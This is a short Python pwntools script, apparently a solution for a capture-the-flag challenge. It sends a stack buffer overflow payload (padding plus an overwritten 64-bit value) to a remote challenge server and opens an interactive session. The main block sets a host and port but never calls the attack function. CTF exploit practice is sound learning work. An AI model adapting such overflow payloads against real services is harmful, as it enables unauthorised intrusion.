from pwn import *

def attack1(url, port):
    p = remote(url, port)
    payload = b'a'*(0x30+8) + p64(0x1)
    p.sendline(payload)
    p.interactive()

if __name__ == '__main__':
    url = 'node5.anna.nssctf.cn'
    port = 26948
